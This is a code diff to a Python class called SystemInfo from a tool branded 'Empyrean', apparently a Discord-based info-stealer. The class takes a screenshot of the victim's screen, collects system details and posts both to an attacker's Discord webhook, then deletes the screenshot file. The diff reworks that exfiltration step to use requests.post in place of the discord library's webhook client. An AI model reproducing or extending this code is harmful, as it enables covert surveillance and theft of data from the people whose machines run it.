@@ -1,20 +1,15 @@
+import requests
 import ctypes
 import os
 import re
 import subprocess
 import uuid
-
 import psutil
-import requests
-import wmi
-from discord import Embed, File, SyncWebhook
+from discord import Embed, File
 from PIL import ImageGrab
-import time
-
 
 class SystemInfo():
-    def __init__(self, webhook: str) -> None:
-        webhook = SyncWebhook.from_url(webhook)
+    def __init__(self, webhook_url: str) -> None:
         embed = Embed(title="System Information", color=0x000000)
 
         embed.add_field(
@@ -52,15 +47,19 @@ class SystemInfo():
         image.save("screenshot.png")
         embed.set_image(url="attachment://screenshot.png")
 
+        webhook_payload = {
+            "content": "System Information",
+            "embeds": [embed.to_dict()],
+            "username": "Empyrean",
+            "avatar_url": "https://i.imgur.com/HjzfjfR.png"
+        }
+
+        files = {'file': open('.\\screenshot.png', 'rb')}
+
         try:
-            webhook.send(
-                embed=embed,
-                file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
-            )
-        except:
-            pass
+            requests.post(webhook_url, json=webhook_payload, files=files)
+        except requests.exceptions.RequestException as e:
+            print(f"Erro ao enviar a mensagem: {e}")
 
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
